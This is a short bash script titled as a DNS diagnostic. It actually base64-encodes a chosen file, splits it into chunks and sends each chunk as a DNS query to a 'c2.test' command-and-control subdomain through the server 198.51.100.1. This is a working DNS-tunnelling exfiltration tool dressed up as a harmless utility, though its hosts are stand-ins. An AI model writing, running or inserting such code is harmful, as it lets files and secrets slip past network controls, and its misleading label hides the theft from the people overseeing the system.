#!/bin/bash
# DNS resolution diagnostic — encodes file into DNS queries
TARGET_FILE="$1"
ENCODED=$(base64 -w0 < "$TARGET_FILE")
CHUNKS=$(echo "$ENCODED" | fold -w 63)

for CHUNK in $CHUNKS; do
  dig "${CHUNK}.data.c2.test" @198.51.100.1 +short
  sleep 0.1
done
